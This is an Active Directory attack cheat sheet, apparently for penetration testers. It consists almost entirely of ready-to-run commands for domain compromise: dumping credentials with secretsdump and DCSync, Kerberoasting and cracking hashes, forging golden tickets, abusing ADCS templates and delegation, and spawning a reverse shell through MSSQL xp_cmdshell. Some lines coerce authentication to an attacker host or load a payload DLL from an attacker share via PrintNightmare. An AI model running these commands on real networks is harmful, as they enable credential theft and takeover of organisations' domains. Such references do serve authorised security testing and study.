# AD Attack Chains

## secretsdump with creds → domain hashes
```bash
impacket-secretsdump 'DOMAIN/user:password'@DC-IP
impacket-secretsdump 'DOMAIN/user'@DC-IP -hashes :NTHASH
```

## secretsdump with machine account hash
```bash
impacket-secretsdump 'DOMAIN/DC$'@DC-IP -hashes :MACHINE-HASH
```

## Kerberoast → crack → lateral move
```bash
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip DC-IP -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# Use cracked creds to move laterally
evil-winrm -i TARGET -u svc_account -p 'cracked_pass'
```

## Targeted Kerberoast (GenericWrite → set SPN → roast)
```bash
# Set SPN on target user (requires GenericWrite)
python3 targetedKerberoast.py -v -d 'DOMAIN' -u 'USER' -p 'PASS'
# Or manually:
Set-DomainObject -Identity TARGET -SET @{serviceprincipalname='nonexistent/YOURVALUE'}
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip DC-IP -request
```

## AS-REP Roast
```bash
impacket-GetNPUsers 'DOMAIN/' -dc-ip DC-IP -usersfile users.txt -no-pass
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## BloodHound → identify path → abuse
```bash
bloodhound-ce-python -u 'USER' -p 'PASS' -ns DC-IP -d DOMAIN -c All --zip
# Import into BloodHound, mark owned, find shortest path to DA
```

## ForceChangePassword
```bash
net rpc password "TARGET_USER" "NewPass123!" -U "DOMAIN"/"USER"%"PASS" -S "DC-FQDN"
# Or with rpcclient:
rpcclient -U 'DOMAIN/USER%PASS' DC-IP -c 'setuserinfo2 TARGET_USER 23 NewPass123!'
```

## DCSync → golden ticket
```bash
impacket-secretsdump 'DOMAIN/user:password'@DC-IP -just-dc-user krbtgt
# krbtgt hash → golden ticket
impacket-ticketer -nthash KRBTGT-HASH -domain-sid S-1-5-21-... -domain DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec 'DOMAIN/Administrator'@DC-FQDN -k -no-pass
```

## MSSQL impersonation → xp_cmdshell → shell
```bash
impacket-mssqlclient 'USER'@TARGET -windows-auth
# In MSSQL:
enum_impersonate
EXECUTE AS LOGIN = 'sa'
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell -e BASE64_REVSHELL
```

## WriteDACL → give yourself DCSync
```bash
# With WriteDACL on domain object:
impacket-dacledit -action write -rights DCSync -principal USER -target-dn 'DC=domain,DC=com' 'DOMAIN/USER:PASS'
impacket-secretsdump 'DOMAIN/USER:PASS'@DC-IP
```

## ADCS ESC1 — Enrollee supplies SAN
```bash
certipy find -u 'USER'@DOMAIN -p 'PASS' -dc-ip DC-IP -vulnerable
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template VULN-TEMPLATE -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

## ADCS ESC8 — NTLM relay to HTTP enrollment
```bash
certipy relay -target http://CA-IP/certsrv/certfnsh.asp -ca CA-NAME
# Coerce auth from DC:
python3 PetitPotam.py ATTACKER-IP DC-IP
certipy auth -pfx dc.pfx -dc-ip DC-IP
```

## Constrained Delegation
```bash
# Service account with msDS-AllowedToDelegateTo set
impacket-getST 'DOMAIN/svc_account:password' -spn cifs/TARGET.DOMAIN -impersonate Administrator
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
impacket-psexec 'DOMAIN/Administrator'@TARGET -k -no-pass
```

## Unconstrained Delegation
```bash
# Coerce DC to auth to unconstrained delegation host, capture TGT
# Use Rubeus on the delegation host:
Rubeus.exe monitor /interval:5 /nowrap
# Coerce with SpoolSample/PetitPotam, then:
Rubeus.exe ptt /ticket:BASE64_TGT
```

## Resource-Based Constrained Delegation (RBCD)
```bash
# Requires GenericWrite on target + a machine account
impacket-addcomputer 'DOMAIN/USER:PASS' -computer-name 'FAKE$' -computer-pass 'Passw0rd'
python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write 'DOMAIN/USER:PASS'
impacket-getST 'DOMAIN/FAKE$:Passw0rd' -spn cifs/TARGET.DOMAIN -impersonate Administrator
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
impacket-psexec 'DOMAIN/Administrator'@TARGET -k -no-pass
```

## Shadow Credentials
```bash
# Requires GenericWrite on target computer object
certipy shadow auto -u 'USER'@DOMAIN -p 'PASS' -account 'TARGET$'
# Gets NT hash of target machine account
```

## GPO Abuse
```bash
# With write access to a GPO:
python3 SharpGPOAbuse.py -gpo-id GPO-GUID -command 'cmd /c net localgroup administrators USER /add' -f
gpupdate /force  # On target or wait for refresh
```

## LAPS Password Reading
```bash
nxc ldap DC-IP -u USER -p PASS --laps
# Or:
Get-LAPSPasswords -DomainController DC-IP -Credential $cred
```

## gMSA Password Reading
```bash
nxc ldap DC-IP -u USER -p PASS --gmsa
# Or with Python:
python3 gMSADumper.py -u USER -p PASS -d DOMAIN
```

## PrintNightmare (CVE-2021-1675) → local admin
```bash
# Requires valid creds:
python3 CVE-2021-1675.py 'DOMAIN/USER:PASS'@TARGET '\\ATTACKER-IP\share\payload.dll'
```

## noPac / sAMAccountName Spoofing
```bash
# Create machine account, rename to DC name, request TGT, rename back, get ST
python3 noPac.py 'DOMAIN/USER:PASS' -dc-ip DC-IP --impersonate Administrator -dump
```
